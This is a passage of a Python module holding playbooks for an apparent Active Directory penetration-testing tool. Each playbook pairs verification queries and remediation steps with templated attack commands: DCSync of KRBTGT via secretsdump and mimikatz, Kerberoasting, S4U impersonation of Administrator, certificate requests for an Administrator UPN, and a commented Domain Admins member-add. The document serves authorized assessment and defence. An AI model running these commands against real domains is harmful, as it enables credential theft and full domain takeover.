"""PoC roadmaps and command templates for Domain Admin takeover paths.

English source text lives here. Turkish presentation is applied in
``reporting.domain_admin_takeover_i18n``. Command bodies stay in English in
both languages so operators can paste them unchanged.

Templates use {TARGET}, {TARGETS}, {DOMAIN}, {DC_IP}, and {DOMAIN_DN}.
They are for authorized assessments only.
"""

from __future__ import annotations

from typing import Any


def domain_to_dn(domain: str | None) -> str:
    """Return an LDAP domain DN, or a placeholder when the FQDN is unknown."""
    text = str(domain or "").strip()
    if not text or text.upper() in {"DOMAIN", "DC_IP"}:
        return "DC=DOMAIN,DC=COM"
    if "DC=" in text.upper():
        return text
    parts = [part for part in text.replace(" ", "").split(".") if part]
    if not parts:
        return "DC=DOMAIN,DC=COM"
    return ",".join(f"DC={part}" for part in parts)


def fill_placeholders(
    text: str,
    *,
    target: str = "TARGET",
    targets: str = "TARGET",
    domain: str = "DOMAIN",
    dc_ip: str = "DC_IP",
) -> str:
    """Replace playbook placeholders. Longer tokens are applied first."""
    replacements = (
        ("{DOMAIN_DN}", domain_to_dn(domain)),
        ("{TARGETS}", targets or "TARGET"),
        ("{TARGET}", target or "TARGET"),
        ("{DOMAIN}", domain or "DOMAIN"),
        ("{DC_IP}", dc_ip or "DC_IP"),
    )
    filled = text
    for token, value in replacements:
        filled = filled.replace(token, value)
    return filled


def fill_playbook_fields(value: Any, **ctx: str) -> Any:
    """Recursively fill placeholders in playbook strings."""
    if isinstance(value, str):
        return fill_placeholders(value, **ctx)
    if isinstance(value, list):
        return [fill_playbook_fields(item, **ctx) for item in value]
    if isinstance(value, dict):
        return {key: fill_playbook_fields(item, **ctx) for key, item in value.items()}
    return value


def _step(step: str, detail: str, expected: str) -> dict[str, str]:
    return {"step": step, "detail": detail, "expected": expected}


def _cmd(cmd_id: str, label: str, command: str) -> dict[str, str]:
    return {"id": cmd_id, "label": label, "command": command}


def _book(
    poc_roadmap: list[dict[str, str]],
    verify_commands: list[dict[str, str]],
    assessment_commands: list[dict[str, str]],
    tools: list[str],
) -> dict[str, Any]:
    return {
        "poc_roadmap": poc_roadmap,
        "verify_commands": verify_commands,
        "assessment_commands": assessment_commands,
        "tools": tools,
    }


DA_PATH_PLAYBOOKS: dict[str, dict[str, Any]] = {
    "dcsync": _book(
        [
            _step(
                "Confirm the replication ACE against the named trustee",
                "Scan evidence lists {TARGETS} with DS-Replication-Get-Changes and/or "
                "DS-Replication-Get-Changes-All on the domain naming context. Default "
                "holders are Domain Controller computer accounts and a documented Entra "
                "Connect gMSA. Any other trustee is the PoC starting point.",
                "dsacls / Get-Acl output shows the trustee on the domain NC for GUID "
                "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 and/or 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2.",
            ),
            _step(
                "Treat the trustee as Domain Admin equivalent",
                "Those extended rights authorize a DRS GetNCChanges request for any secret "
                "in the domain, including KRBTGT and Domain Admins. The account never needs "
                "to be added to Domain Admins.",
                "The engagement record states that compromise of {TARGET} equals domain takeover.",
            ),
            _step(
                "Authorized DCSync validation (stop after proof)",
                "In an authorized test, request directory replication as the evidenced "
                "trustee and capture only enough proof (for example KRBTGT pwdLastSet / "
                "hash presence) to demonstrate the right. Do not dump the full domain.",
                "A successful GetNCChanges against the domain NC as {TARGET} is the PoC. "
                "Then remove the ACE and rotate KRBTGT twice.",
            ),
            _step(
                "Close the path",
                "Remove the ACE from every non-DC, non-documented-sync principal, then "
                "double-rotate KRBTGT so any previously replicated key dies.",
                "Re-scan shows no non-default replication trustees; 4662 from non-DC hosts is alerted.",
            ),
        ],
        [
            _cmd(
                "dcsync_dsacls",
                "dsacls — domain NC replication ACEs",
                'dsacls "{DOMAIN_DN}" | findstr /I "Replicating Directory Changes"',
            ),
            _cmd(
                "dcsync_powershell_acl",
                "PowerShell — replication extended-right trustees",
                "$dn = '{DOMAIN_DN}'\n"
                "$repl = @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2','89e95b76-444d-4c62-991a-0facbeda640c')\n"
                "(Get-Acl \"AD:$dn\").Access |\n"
                "  Where-Object { $repl -contains $_.ObjectType.Guid } |\n"
                "  Format-Table IdentityReference, ActiveDirectoryRights, ObjectType -AutoSize",
            ),
            _cmd(
                "dcsync_ldap_trustee",
                "LDAP — confirm the evidenced trustee still exists and is enabled",
                'Get-ADObject -LDAPFilter "(sAMAccountName={TARGET})" -Properties adminCount,userAccountControl | Format-List',
            ),
        ],
        [
            _cmd(
                "dcsync_secretsdump",
                "Impacket — DCSync as the evidenced trustee (authorized assessment)",
                "secretsdump.py {DOMAIN}/{TARGET}:PASSWORD@{DC_IP} -just-dc-user krbtgt",
            ),
            _cmd(
                "dcsync_mimikatz",
                "Mimikatz — DCSync of KRBTGT only (authorized assessment)",
                "lsadump::dcsync /domain:{DOMAIN} /user:krbtgt /csv",
            ),
        ],
        ["dsacls", "Get-Acl (AD:)", "Impacket secretsdump", "Mimikatz lsadump::dcsync"],
    ),
    "kerberoasting": _book(
        [
            _step(
                "Inventory user accounts with SPNs from this scan",
                "Kerberoasting targets are enabled user accounts with servicePrincipalName, "
                "not computer accounts. Prioritize {TARGETS} when they are privileged, have "
                "old passwords, or still allow RC4.",
                "Get-ADUser shows servicePrincipalName populated and Enabled=$true for each listed target.",
            ),
            _step(
                "Request a TGS as any domain user (normal Kerberos)",
                "A TGS-REQ for the SPN is a legitimate Kerberos operation. The ticket is "
                "encrypted to the service account secret and can be attacked offline without lockout.",
                "A 4769 for the target SPN is expected. Offline cracking is out of band; a weak or "
                "privileged SPN is already an open DA path.",
            ),
            _step(
                "Map the recovered identity to Domain Admin",
                "If the account is in Domain Admins, can log on to a DC, or holds GenericAll/"
                "WriteDACL/RBCD toward Tier 0, the cracked secret is a DA finish.",
                "Group membership, adminCount, and ACL edges for {TARGET} are documented as the DA hop.",
            ),
            _step(
                "Close the path",
                "Move the service to a gMSA/dMSA, drop user SPNs, and enforce AES-only encryption.",
                "Re-scan shows no privileged user SPNs; 4769 volume for those names returns to baseline.",
            ),
        ],
        [
            _cmd(
                "kerb_get_aduser",
                "PowerShell — SPNs, encryption, and privilege on the evidenced account",
                "Get-ADUser {TARGET} -Properties servicePrincipalName,msDS-SupportedEncryptionTypes,"
                "PasswordLastSet,adminCount,MemberOf |\n"
                "  Select-Object SamAccountName,Enabled,adminCount,PasswordLastSet,"
                "servicePrincipalName,'msDS-SupportedEncryptionTypes',MemberOf",
            ),
            _cmd(
                "kerb_ldap_spn_hunt",
                "LDAP — all enabled user SPNs (inventory)",
                'Get-ADUser -Filter {servicePrincipalName -like "*" -and Enabled -eq $true} '
                "-Properties servicePrincipalName,adminCount,PasswordLastSet |\n"
                "  Select-Object SamAccountName,adminCount,PasswordLastSet,servicePrincipalName",
            ),
        ],
        [
            _cmd(
                "kerb_getuserspns",
                "Impacket — request TGS for the evidenced SPN account (authorized assessment)",
                "GetUserSPNs.py {DOMAIN}/USER:PASSWORD -dc-ip {DC_IP} -request-user {TARGET}",
            ),
            _cmd(
                "kerb_rubeus",
                "Rubeus — Kerberoast a specific user (authorized assessment)",
                "Rubeus.exe kerberoast /user:{TARGET} /nowrap /outfile:{TARGET}.kirbi",
            ),
            _cmd(
                "kerb_cme",
                "NetExec — Kerberoasting via LDAP (authorized assessment)",
                "netexec ldap {DC_IP} -u USER -p PASSWORD --kerberoasting {TARGET}.hashes",
            ),
        ],
        ["Get-ADUser", "Impacket GetUserSPNs", "Rubeus kerberoast", "NetExec ldap"],
    ),
    "asrep": _book(
        [
            _step(
                "Confirm DONT_REQUIRE_PREAUTH on the evidenced accounts",
                "userAccountControl bit 0x400000 (DONT_REQUIRE_PREAUTH) lets anyone request "
                "an encrypted TGT for {TARGETS} with no valid credentials.",
                "Get-ADUser shows DoesNotRequirePreAuth=$true and Enabled=$true.",
            ),
            _step(
                "Request an AS-REP without a password",
                "The AS-REP is encrypted to the account password. Offline cracking does not "
                "lock the account. If the account is privileged or the password is reused on "
                "a DA identity, this is an unauthenticated DA path.",
                "GetNPUsers/Rubeus returns a $krb5asrep$ hash for {TARGET}.",
            ),
            _step(
                "Close the path",
                "Clear DONT_REQUIRE_PREAUTH, rotate the password, and place privileged users in Protected Users.",
                "Re-scan shows no pre-auth-disabled enabled users; 4768 Pre-Authentication Type 0 disappears.",
            ),
        ],
        [
            _cmd(
                "asrep_get_aduser",
                "PowerShell — pre-authentication flag on the evidenced account",
                "Get-ADUser {TARGET} -Properties DoesNotRequirePreAuth,userAccountControl,adminCount,Enabled,MemberOf |\n"
                "  Format-List SamAccountName,Enabled,DoesNotRequirePreAuth,adminCount,MemberOf",
            ),
            _cmd(
                "asrep_hunt",
                "PowerShell — domain-wide DONT_REQUIRE_PREAUTH inventory",
                "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and Enabled -eq $true} "
                "-Properties DoesNotRequirePreAuth,adminCount |\n"
                "  Select-Object SamAccountName,adminCount,Enabled",
            ),
        ],
        [
            _cmd(
                "asrep_getnpusers",
                "Impacket — AS-REP for the evidenced account, no password (authorized assessment)",
                "GetNPUsers.py {DOMAIN}/{TARGET} -no-pass -dc-ip {DC_IP} -request",
            ),
            _cmd(
                "asrep_rubeus",
                "Rubeus — AS-REP roast a specific user (authorized assessment)",
                "Rubeus.exe asreproast /user:{TARGET} /format:hashcat /nowrap",
            ),
        ],
        ["Get-ADUser", "Impacket GetNPUsers", "Rubeus asreproast"],
    ),
    "unconstrained_delegation": _book(
        [
            _step(
                "Separate Domain Controllers from extra unconstrained delegates",
                "TRUSTED_FOR_DELEGATION is expected on DCs. Scan evidence {TARGETS} is a "
                "member server or user that caches TGTs of anyone who authenticates to it.",
                "Get-ADComputer/User shows TrustedForDelegation=$true and the object is not in Domain Controllers.",
            ),
            _step(
                "Show that a privileged TGT can land on that host",
                "Print spooler, other coercion, or an admin browsing a share deposits a DA "
                "TGT in memory. Protected Users blocks this; absence of that group on DA accounts is part of the PoC.",
                "The host is documented as a DA landing zone; 4769 forwarded-TGT and 4624 from DA SIDs are the detection pair.",
            ),
            _step(
                "Close the path",
                "Clear unconstrained delegation everywhere except DCs; move leftovers to constrained or RBCD; add Tier 0 to Protected Users.",
                "Re-scan shows only DC computer accounts with TRUSTED_FOR_DELEGATION.",
            ),
        ],
        [
            _cmd(
                "unconst_computers",
                "PowerShell — unconstrained computer accounts excluding DCs",
                "Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,PrimaryGroupID |\n"
                "  Where-Object { $_.PrimaryGroupID -ne 516 } |\n"
                "  Select-Object Name,DistinguishedName,TrustedForDelegation",
            ),
            _cmd(
                "unconst_target",
                "PowerShell — evidenced unconstrained object",
                "Get-ADObject -LDAPFilter \"(sAMAccountName={TARGET})\" "
                "-Properties userAccountControl,msDS-AllowedToDelegateTo | Format-List",
            ),
        ],
        [
            _cmd(
                "unconst_finddelegation",
                "Impacket — list unconstrained/constrained/RBCD delegates (authorized assessment)",
                "findDelegation.py {DOMAIN}/USER:PASSWORD -dc-ip {DC_IP}",
            ),
            _cmd(
                "unconst_rubeus_monitor",
                "Rubeus — monitor for inbound TGTs on the unconstrained host (authorized assessment)",
                "Rubeus.exe monitor /interval:5 /filteruser:Administrator",
            ),
        ],
        ["Get-ADComputer", "Impacket findDelegation", "Rubeus monitor"],
    ),
    "constrained_delegation": _book(
        [
            _step(
                "Read msDS-AllowedToDelegateTo on the evidenced account",
                "{TARGETS} may request S4U2Self/S4U2Proxy service tickets to the listed SPNs. "
                "ldap/, cifs/, http/, or host/ on a Domain Controller is Domain Admin equivalent impersonation.",
                "Get-ADObject shows AllowedToDelegateTo containing a DC or other Tier 0 SPN.",
            ),
            _step(
                "Prove S4U can impersonate a privileged user to that SPN",
                "Compromise of the trusted account is enough; the KDC issues a service ticket as the impersonated user to the allowed SPN.",
                "getST/Rubeus s4u against a DC SPN as Administrator is the authorized PoC. Then remove the grant.",
            ),
            _step(
                "Close the path",
                "Remove constrained delegation to Tier 0 SPNs; prefer resource-based grants with a documented owner; Protected Users for DA.",
                "Re-scan shows no non-DC allowed-to-delegate entries pointing at DC SPNs.",
            ),
        ],
        [
            _cmd(
                "const_allowed",
                "PowerShell — allowed-to-delegate SPNs on the evidenced object",
                "Get-ADObject -LDAPFilter \"(sAMAccountName={TARGET})\" "
                "-Properties msDS-AllowedToDelegateTo,userAccountControl |\n"
                "  Select-Object Name,sAMAccountName,'msDS-AllowedToDelegateTo'",
            ),
            _cmd(
                "const_hunt",
                "PowerShell — any non-empty msDS-AllowedToDelegateTo",
                "Get-ADObject -LDAPFilter \"(msDS-AllowedToDelegateTo=*)\" "
                "-Properties msDS-AllowedToDelegateTo |\n"
                "  Select-Object Name,sAMAccountName,'msDS-AllowedToDelegateTo'",
            ),
        ],
        [
            _cmd(
                "const_getst",
                "Impacket — S4U2Self/S4U2Proxy to a DC SPN (authorized assessment)",
                "getST.py -spn cifs/{DC_IP} -impersonate Administrator "
                "-dc-ip {DC_IP} {DOMAIN}/{TARGET}:PASSWORD",
            ),
            _cmd(
                "const_rubeus_s4u",
                "Rubeus — constrained delegation S4U (authorized assessment)",
                "Rubeus.exe s4u /user:{TARGET} /rc4:NTHASH /impersonateuser:Administrator "
                "/msdsspn:cifs/dc.{DOMAIN} /altservice:ldap,cifs /ptt",
            ),
        ],
        ["Get-ADObject", "Impacket getST", "Rubeus s4u"],
    ),
    "rbcd": _book(
        [
            _step(
                "Confirm msDS-AllowedToActOnBehalfOfOtherIdentity on a high-value computer",
                "RBCD on {TARGETS} lets the listed principals impersonate users to that host. "
                "Pointed at a DC, PKI, or DA workstation, that is a DA service ticket.",
                "The attribute is non-empty, or a trustee has GenericWrite/GenericAll on the computer object.",
            ),
            _step(
                "Show the write primitive if the grant is not already present",
                "MachineAccountQuota > 0 plus GenericWrite on a DC/computer is enough to set RBCD from a controlled computer account.",
                "The PoC records either an existing RBCD ACE toward Tier 0 or a write path that can create one.",
            ),
            _step(
                "Authorized S4U as a privileged user to the resource",
                "S4U2Self/S4U2Proxy from the allowed principal yields a usable CIFS/LDAP ticket as Administrator to {TARGET}.",
                "A service ticket as a DA-class user to the target host is the PoC. Then clear the attribute.",
            ),
        ],
        [
            _cmd(
                "rbcd_read",
                "PowerShell — RBCD attribute on the evidenced computer",
                "Get-ADComputer {TARGET} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity,nTSecurityDescriptor |\n"
                "  Format-List Name,'msDS-AllowedToActOnBehalfOfOtherIdentity'",
            ),
            _cmd(
                "rbcd_hunt",
                "PowerShell — any computer with RBCD set",
                "Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |\n"
                "  Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' } |\n"
                "  Select-Object Name,DistinguishedName",
            ),
            _cmd(
                "rbcd_quota",
                "PowerShell — MachineAccountQuota (RBCD companion primitive)",
                "Get-ADObject -Identity '{DOMAIN_DN}' -Properties ms-DS-MachineAccountQuota |\n"
                "  Select-Object -ExpandProperty ms-DS-MachineAccountQuota",
            ),
        ],
        [
            _cmd(
                "rbcd_impacket_write",
                "Impacket — write RBCD from a controlled computer (authorized assessment)",
                "rbcd.py -delegate-from CONTROLLED$ -delegate-to {TARGET} -action write "
                "{DOMAIN}/USER:PASSWORD -dc-ip {DC_IP}",
            ),
            _cmd(
                "rbcd_getst",
                "Impacket — S4U ticket as Administrator to the RBCD target (authorized assessment)",
                "getST.py -spn cifs/{TARGET} -impersonate Administrator "
                "-dc-ip {DC_IP} {DOMAIN}/CONTROLLED$:PASSWORD",
            ),
        ],
        ["Get-ADComputer", "Impacket rbcd.py", "Impacket getST", "Rubeus s4u"],
    ),
    "shadow_credentials": _book(
        [
            _step(
                "Identify who can write msDS-KeyCredentialLink",
                "GenericWrite/GenericAll/WriteProperty on {TARGETS} (or AdminSDHolder) is enough "
                "to plant a device key. Written to a DA user, DC computer, or KRBTGT-adjacent object, this is domain takeover.",
                "ACL review shows a non-Tier-0 trustee with write on msDS-KeyCredentialLink for a privileged object.",
            ),
            _step(
                "Treat unexplained KeyCredentialLink values as persistence",
                "A key credential lets the holder PKINIT-authenticate as that object without the password.",
                "Get-ADObject shows msDS-KeyCredentialLink populated on a privileged object without a matching Windows Hello/PAM change ticket.",
            ),
            _step(
                "Authorized PKINIT as the target, then remove the key",
                "In an authorized test, add a key, authenticate, then delete it immediately and rotate.",
                "PKINIT 4768 as {TARGET} is the PoC. Unexpected keys on adminCount=1 objects are removed.",
            ),
        ],
        [
            _cmd(
                "shadow_read",
                "PowerShell — KeyCredentialLink on the evidenced object",
                "Get-ADObject -LDAPFilter \"(sAMAccountName={TARGET})\" "
                "-Properties msDS-KeyCredentialLink,adminCount |\n"
                "  Select-Object Name,sAMAccountName,adminCount,'msDS-KeyCredentialLink'",
            ),
            _cmd(
                "shadow_hunt",
                "PowerShell — privileged objects with a key credential present",
                "Get-ADObject -LDAPFilter \"(&(msDS-KeyCredentialLink=*)(|(adminCount=1)(sAMAccountName=krbtgt)))\" "
                "-Properties msDS-KeyCredentialLink,adminCount |\n"
                "  Select-Object Name,sAMAccountName,adminCount",
            ),
        ],
        [
            _cmd(
                "shadow_certipy",
                "Certipy — Shadow Credentials against the evidenced account (authorized assessment)",
                "certipy shadow auto -u USER@{DOMAIN} -p PASSWORD -account {TARGET} -dc-ip {DC_IP}",
            ),
            _cmd(
                "shadow_whisker",
                "Whisker — add a key credential (authorized assessment)",
                "Whisker.exe add /target:{TARGET} /domain:{DOMAIN} /dc:{DC_IP}",
            ),
        ],
        ["Get-ADObject", "Certipy shadow", "Whisker", "DSInternals"],
    ),
    "adcs": _book(
        [
            _step(
                "Classify the evidenced template/CA issue (ESC1–ESC16)",
                "Scan evidence {TARGETS} is a template or CA flag that can issue a certificate "
                "usable for domain authentication as a privileged user. ESC1 (enrollee SAN + Client Auth), "
                "ESC6/ESC15 (EDITF_ATTRIBUTESUBJECTALTNAME2 / schema v1), and ESC8 (HTTP web enrollment + NTLM) are the usual DA-class paths.",
                "certipy find / Certify lists the template as vulnerable with enroll rights for a broad group.",
            ),
            _step(
                "Show that a Domain Admin UPN/SAN can be requested",
                "A certificate that names a DA account authenticates to LDAP/CIFS via PKINIT or Schannel.",
                "Enrollment as a low-privilege user producing a cert for Administrator@{DOMAIN} is the PoC.",
            ),
            _step(
                "Close the path",
                "Disable unused templates, require manager approval, remove enrollee SAN, enforce LDAP channel binding, and disable HTTP enrollment or Kerberos-only.",
                "Re-scan shows no enrollable DA-class templates; CA 4886/4887 for privileged SANs is alerted.",
            ),
        ],
        [
            _cmd(
                "adcs_certutil_templates",
                "certutil — published templates",
                "certutil -config - -TCAInfo\ncertutil -v -template",
            ),
            _cmd(
                "adcs_certipy_find",
                "Certipy — enumerate vulnerable templates (read-only)",
                "certipy find -u USER@{DOMAIN} -p PASSWORD -dc-ip {DC_IP} -stdout -vulnerable",
            ),
            _cmd(
                "adcs_ldap_template",
                "PowerShell — evidenced template object",
                "Get-ADObject -LDAPFilter \"(|(name={TARGET})(displayName={TARGET}))\" "
                "-SearchBase \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{DOMAIN_DN}\" "
                "-Properties * |\n  Select-Object Name,displayName,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,pKIExtendedKeyUsage",
            ),
        ],
        [
            _cmd(
                "adcs_certipy_req",
                "Certipy — request a certificate as a privileged UPN (authorized assessment, ESC1-class)",
                "certipy req -u USER@{DOMAIN} -p PASSWORD -dc-ip {DC_IP} "
                "-ca CA_NAME -template {TARGET} -upn Administrator@{DOMAIN}",
            ),
            _cmd(
                "adcs_certipy_auth",
                "Certipy — authenticate with the issued PFX (authorized assessment)",
                "certipy auth -pfx administrator.pfx -dc-ip {DC_IP} -domain {DOMAIN}",
            ),
        ],
        ["certutil", "Certipy find/req/auth", "Certify", "CA audit 4886/4887"],
    ),
    "gpo_acl": _book(
        [
            _step(
                "Identify GPOs linked to Domain Controllers or other Tier 0 OUs",
                "Scan evidence {TARGETS} can edit a GPO that applies to DCs or privileged users. "
                "Immediate tasks, startup scripts, or GPP local-admin run as SYSTEM on the DC.",
                "Get-GPOReport / GPMC shows Edit settings, Modify security, or Delete for a non-Tier-0 trustee on a DC-linked GPO.",
            ),
            _step(
                "Show the next gpupdate is code execution as SYSTEM on a DC",
                "That is Domain Admin. Do not plant a task in production; document the ACL and the link.",
                "The PoC is the ACL plus the link to OU=Domain Controllers (or Default Domain Controllers Policy), not a payload.",
            ),
            _step(
                "Close the path",
                "Restrict GPO edit to a tiny Tier 0 group; enable 5136/5137 and SYSVOL integrity monitoring.",
                "Re-scan shows only Tier 0 editors on DC-linked GPOs.",
            ),
        ],
        [
            _cmd(
                "gpo_get_gpo",
                "PowerShell — GPO identity and status",
                "Get-GPO -All | Where-Object { $_.DisplayName -match '{TARGET}' -or $_.Id -eq '{TARGET}' } |\n"
                "  Format-List DisplayName,Id,GpoStatus,CreationTime,ModificationTime",
            ),
            _cmd(
                "gpo_acl",
                "PowerShell — who can edit the evidenced GPO",
                "Get-GPPermission -Name '{TARGET}' -All | Format-Table Trustee, Permission, Inherited -AutoSize",
            ),
            _cmd(
                "gpo_links",
                "PowerShell — where the GPO is linked",
                "Get-ADOrganizationalUnit -Filter * -Properties gplink |\n"
                "  Where-Object { $_.gplink -and $_.gplink -like '*{TARGET}*' } |\n"
                "  Select-Object DistinguishedName,gplink",
            ),
        ],
        [
            _cmd(
                "gpo_sysvol_list",
                "SMB — list SYSVOL GPO content (read-only proof)",
                "smbclient //{DC_IP}/SYSVOL -U {DOMAIN}/USER -c \"ls {DOMAIN}/Policies\"",
            ),
            _cmd(
                "gpo_sharpgpoabuse_note",
                "Authorized assessment note — do not deploy a DC scheduled task",
                "# Proof is ACL + DC link. If a lab requires a controlled scheduled-task PoC,\n"
                "# use a dedicated test OU/GPO, never Default Domain Controllers Policy.\n"
                "# SharpGPOAbuse.exe --AddComputerTask --TaskName Demo --GPOName '{TARGET}' ...",
            ),
        ],
        ["Get-GPO", "Get-GPPermission", "smbclient SYSVOL", "GPO audit 5136/5137"],
    ),
    "gpp_passwords": _book(
        [
            _step(
                "Locate Groups.xml / Services.xml with cpassword in SYSVOL",
                "Authenticated Users can read SYSVOL by default. Scan evidence {TARGETS} is a GPO "
                "preference file whose AES key is publicly known.",
                "The XML contains a cpassword attribute; gpp-decrypt recovers the plaintext.",
            ),
            _step(
                "Map the recovered account to DC logon or Domain Admins",
                "These passwords are often domain-join, local admin, or service accounts. Reuse on a DC or DA identity is the DA finish.",
                "The recovered username is documented against privileged groups and inbound local-admin on DCs.",
            ),
            _step(
                "Close the path",
                "Delete the XML from SYSVOL and backups, rotate every recovered password, and never store secrets in GPO.",
                "Select-String over SYSVOL finds no cpassword; passwords are rotated.",
            ),
        ],
        [
            _cmd(
                "gpp_select_string",
                "PowerShell — search SYSVOL for cpassword",
                "Get-ChildItem \\\\domain\\SYSVOL -Recurse -Include Groups.xml,Services.xml,ScheduledTasks.xml,DataSources.xml,Drives.xml -ErrorAction SilentlyContinue |\n"
                "  Select-String -Pattern 'cpassword' ",
            ),
            _cmd(
                "gpp_smbclient",
                "smbclient — list SYSVOL (any authenticated user)",
                "smbclient //{DC_IP}/SYSVOL -U {DOMAIN}/USER -c ls",
            ),
        ],
        [
            _cmd(
                "gpp_getgpppassword",
                "Get-GPPPassword — decrypt SYSVOL credentials (authorized assessment)",
                "Get-GPPPassword.py {DOMAIN}/USER:PASSWORD@{DC_IP}",
            ),
            _cmd(
                "gpp_decrypt",
                "gpp-decrypt — decrypt a captured cpassword blob",
                "gpp-decrypt 'CPASSWORD_VALUE'",
            ),
        ],
        ["smbclient", "Select-String", "Impacket Get-GPPPassword", "gpp-decrypt"],
    ),
    "acl_generic_all": _book(
        [
            _step(
                "Graph the control edge into a DA-class object",
                "Scan evidence {TARGETS} holds GenericAll, WriteDACL, WriteOwner, ForceChangePassword, "
                "or WriteMember on Domain Admins, AdminSDHolder, a DA user, or a nested admin group.",
                "dsacls / BloodHound shows the trustee on a Tier 0 object with a control right.",
            ),
            _step(
                "Name the single LDAP write that finishes DA",
                "Password reset, member add, or DACL rewrite is enough. Do not perform the write in production; document the ACE and the object.",
                "The PoC is: principal P with right R on object O, where O is DA-class. That triple is domain takeover.",
            ),
            _step(
                "Close the path",
                "Reset AdminSDHolder to the Microsoft default, strip broad ACEs, run SDProp, and review adminCount=1 orphans.",
                "Re-scan shows no non-admin GenericAll/WriteDACL on AdminSDHolder or Domain Admins.",
            ),
        ],
        [
            _cmd(
                "acl_dsacls_da",
                "dsacls — Domain Admins and AdminSDHolder",
                "dsacls \"CN=Domain Admins,CN=Users,{DOMAIN_DN}\"\n"
                "dsacls \"CN=AdminSDHolder,CN=System,{DOMAIN_DN}\"",
            ),
            _cmd(
                "acl_target",
                "PowerShell — security descriptor on the evidenced object",
                "Get-ADObject -LDAPFilter \"(sAMAccountName={TARGET})\" -Properties nTSecurityDescriptor,adminCount |\n"
                "  Format-List DistinguishedName,adminCount",
            ),
            _cmd(
                "acl_bloodhound_note",
                "BloodHound — GenericAll/WriteDACL into Domain Admins",
                "MATCH p=(n)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AddMember*1..3]->(m:Group)\n"
                "WHERE m.objectid ENDS WITH '-512'\nRETURN p LIMIT 25",
            ),
        ],
        [
            _cmd(
                "acl_dacledit_note",
                "Impacket dacledit — read the ACE (authorized assessment; prefer read-only)",
                "dacledit.py -action read -principal {TARGET} -target-dn \"CN=Domain Admins,CN=Users,{DOMAIN_DN}\" "
                "{DOMAIN}/USER:PASSWORD -dc-ip {DC_IP}",
            ),
            _cmd(
                "acl_bloodyad_note",
                "Authorized assessment note — do not add yourself to Domain Admins in production",
                "# Proof is the ACE. A lab-only member-add would look like:\n"
                "# bloodyAD.py --host {DC_IP} -d {DOMAIN} -u USER -p PASS add groupMember 'Domain Admins' CONTROLLED\n"
                "# Never run that against a production Domain Admins group.",
            ),
        ],
        ["dsacls", "Get-ADObject", "BloodHound", "Impacket dacledit"],
    ),
    "escalation_graph": _book(
        [
            _step(
                "Write down every hop from the cheapest identity to Domain Admins",
                "Scan evidence {TARGETS} is a scored multi-hop path. Individual ACL, SPN, or "
                "delegation findings are often only one edge; the graph is the complete takeover.",
                "A shortest-path listing names each object, each right, and the DA-class terminal.",
            ),
            _step(
                "Validate the first non-admin hop (it is the cheapest break)",
                "Testers start from GenericWrite, an SPN, or a nested group, not from DA membership.",
                "The first hop is reproduced with the matching verify command from this catalog (ACL, Kerberoast, RBCD, etc.).",
            ),
            _step(
                "Close the cheapest edge first",
                "Removing one non-admin control edge can collapse several DA paths at once.",
                "Re-scan shortest-path to Domain Admins is empty for that principal.",
            ),
        ],
        [
            _cmd(
                "graph_bloodhound",
                "BloodHound — shortest path from the evidenced principal to Domain Admins",
                "MATCH p=shortestPath((n {name:'{TARGET}@{DOMAIN}'})-[*1..8]->(m:Group))\n"
                "WHERE m.objectid ENDS WITH '-512'\nRETURN p",
            ),
            _cmd(
                "graph_member",
                "PowerShell — nested group expansion for the evidenced account",
                "Get-ADPrincipalGroupMembership {TARGET} | Select-Object Name,SamAccountName,SID\n"
                "Get-ADGroupMember 'Domain Admins' -Recursive | Select-Object SamAccountName",
            ),
        ],
        [
            _cmd(
                "graph_follow_first_hop",
                "Follow the first hop with the matching technique playbook",
                "# Identify the first edge type (GenericWrite, SPN, RBCD, GPO, ...)\n"
                "# then run that technique's verification and authorized-assessment commands from this map.\n"
                "# Starting principal: {TARGET}",
            ),
        ],
        ["BloodHound", "Get-ADPrincipalGroupMembership", "this takeover map"],
    ),
    "ops_groups": _book(
        [
            _step(
                "Enumerate members of Backup, Server, Account, Print Operators, and DnsAdmins",
                "Scan evidence {TARGETS} is in a built-in operator group. These groups should be empty. "
                "Membership itself is DA-class: SeBackupPrivilege (NTDS.dit), service/driver load, account manipulation, or DNS DLL load.",
                "Get-ADGroupMember returns at least one enabled principal.",
            ),
            _step(
                "Name the implicit DC-impacting right",
                "Do not dump NTDS or load a DNS DLL in production. Document the privilege and that it runs as SYSTEM on a DC.",
                "The PoC is membership plus the documented implicit right, not a payload on the DC.",
            ),
            _step(
                "Close the path",
                "Empty the operator groups; replace DnsAdmins with least-privilege DNS roles on modern servers.",
                "Re-scan shows zero enabled members; 4728/4732 into those groups is alerted.",
            ),
        ],
        [
            _cmd(
                "ops_members",
                "PowerShell — operator group members",
                "$groups = 'Backup Operators','Server Operators','Account Operators','Print Operators','DnsAdmins'\n"
                "foreach ($g in $groups) {\n"
                "  Write-Output \"=== $g ===\"\n"
                "  Get-ADGroupMember $g -Recursive -ErrorAction SilentlyContinue |\n"
                "    Get-ADObject -Properties sAMAccountName,userAccountControl |\n"
                "    Select-Object Name,sAMAccountName\n"
                "}",
            ),
            _cmd(
                "ops_target",
                "PowerShell — groups of the evidenced principal",
                "Get-ADPrincipalGroupMembership {TARGET} | Select-Object Name,SID",
            ),
        ],
        [
            _cmd(
                "ops_backup_note",
                "Authorized assessment note — Backup Operators / NTDS",
                "# Membership is the finding. A lab-only ntdsutil/IFM or diskshadow copy of NTDS.dit\n"
                "# proves SeBackupPrivilege; do not copy NTDS from production DCs.\n"
                "# whoami /priv   (on a DC session as {TARGET})",
            ),
            _cmd(
                "ops_dnsadmin_note",
                "Authorized assessment note — DnsAdmins DLL load",
                "# Do not load a DLL into DNS on production.\n"
                "# Proof: {TARGET} is in DnsAdmins, which can set the DNS server plugin path.\n"
                "# dnscmd {DC_IP} /config /serverlevelplugindll <path>   # lab only",
            ),
        ],
